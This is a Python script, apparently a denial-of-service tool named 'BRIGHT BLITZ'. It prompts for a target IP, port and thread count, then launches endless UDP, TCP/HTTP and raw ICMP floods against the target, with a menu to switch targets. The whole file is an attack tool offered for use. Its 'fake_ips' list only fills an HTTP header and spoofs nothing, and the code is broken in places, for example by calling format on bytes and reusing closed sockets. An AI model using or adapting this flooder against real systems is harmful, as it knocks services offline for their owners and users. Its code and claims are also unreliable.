import socket
import threading
import random
import time

# ASCII Art Banner
print("""
  _______  _______  _______  _______  _______  _______  _______
 |       ||       ||       ||       ||       ||       ||       |
 |  _____||  _____||  _____||  _____||  _____||  _____||  _____|
 | |_____ | |_____ | |_____ | |_____ | |_____ | |_____ | |_____ 
 |_____  ||_____  ||_____  ||_____  ||_____  ||_____  ||_____  |
        ||       ||       ||       ||       ||       ||       |
        ||_______||_______||_______||_______||_______||_______|
        |       |       |       |       |       |       |       |
        |  BRIGHT  |  BLITZ  |  BRIGHT  |  BLITZ  |  BRIGHT  |  BLITZ  |
        |       |       |       |       |       |       |       |
        |_______|_______|_______|_______|_______|_______|_______|
""")

# Configuration
target = input("Insert target's IP: ")
port = int(input("Insert Port: "))
Trd = int(input("Insert number of Threads: "))
fake_ips = ['44.197.175.168', '192.168.1.100', '10.0.0.1', '8.8.8.8', '8.8.4.4']  # add more fake IPs here

# Attack Functions
def attack_udp():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        sock.sendto(b"GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n".format(random.choice(fake_ips).encode()), (target, port))
        time.sleep(0.01)  # reduce delay to 0.01 seconds

def attack_tcp():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        sock.connect((target, port))
        sock.send(b"GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n".format(random.choice(fake_ips).encode()))
        sock.close()
        time.sleep(0.01)  # reduce delay to 0.01 seconds

def attack_icmp():
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    while True:
        sock.sendto(b"\x08\x00\x00\x00\x00\x00\x00\x00", (target, 0))
        time.sleep(0.01)  # reduce delay to 0.01 seconds

# Start Threads
for i in range(Trd):
    thread = threading.Thread(target=attack_udp)
    thread.start()
    thread = threading.Thread(target=attack_tcp)
    thread.start()
    thread = threading.Thread(target=attack_icmp)
    thread.start()

# Additional Features
while True:
    print("\nOptions:")
    print("1. Change target IP")
    print("2. Change port")
    print("3. Change number of threads")
    print("4. Exit")
    choice = input("Enter your choice: ")
    
    if choice == "1":
        target = input("Enter new target IP now: ")
    elif choice == "2":
        port = int(input("Cmon enter new port: "))
    elif choice == "3":
        Trd = int(input("Oooooo enter new number of threads: "))
    elif choice == "4":
        break
    else:
        print("Invalid choice. Please attempt again.")